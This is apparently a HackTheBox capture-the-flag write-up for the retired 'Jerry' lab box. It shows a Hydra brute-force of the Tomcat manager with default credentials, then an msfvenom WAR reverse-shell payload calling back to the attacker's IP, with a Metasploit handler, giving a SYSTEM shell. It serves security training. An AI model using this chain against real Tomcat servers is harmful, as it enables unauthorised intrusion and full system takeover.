# Jerry

This is the write-up for the box Jerry that got retired at the 17th November 2018.
My IP address was 10.10.14.17 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.95    jerry.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/jerry.nmap 10.10.10.95
```

```markdown
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
```

## Checking HTTP (Port 8080)

On the web page is the default page of a **Tomcat** installation.
The administration page of a default Tomcat server can be found in the _/manager_ directory or clicking on _"Manager App"_.

It asks for a password, so lets try to crack it with **Hydra**:
```markdown
hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt 10.10.10.95 -s 8080 http-get /manager/html
```

The default credentials _"tomcat:s3cret"_ were found and we can log in to the administration page.

### Exploiting Tomcat Web Application Manager

As Tomcat implements Java Servlets, it is possible to upload **Web Application Archive (WAR)** files on the server which is essentially packaged Java code.
Lets create a WAR file with Java code that starts a reverse shell with **Msfvenom**:
```markdown
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.17 LPORT=9001 -f war -o shell.war
```

> Any JSP shell archived in a WAR file can be used for this. There is also one from [SecurityRiskAdvisors on Github](https://github.com/SecurityRiskAdvisors/cmd.jsp)

Starting the listener in **Metasploit**:
```markdown
msf5 > use exploit/multi/handler

msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST tun0
msf5 exploit(multi/handler) > set LPORT 9001

msf5 exploit(multi/handler) > exploit -j
```

Now we can deploy the _shell.war_ file on the server and when clicking on _"/shell"_ in the applications, it shows a HTTP error code _404 Not Found_.
This is because the full name of the **JSP** file in the WAR file has to be requested, which can be found out by unzipping it:
```markdown
unzip shell.war

# Output
(...)
inflating: iklfcfrjeti.jsp
```

So after requesting it on _"http[:]//10.10.10.95:8080/shell/iklfcfrjeti.jsp"_ the meterpreter listener starts a session on the box as _NT Authority/SYSTEM_ and the box is done!
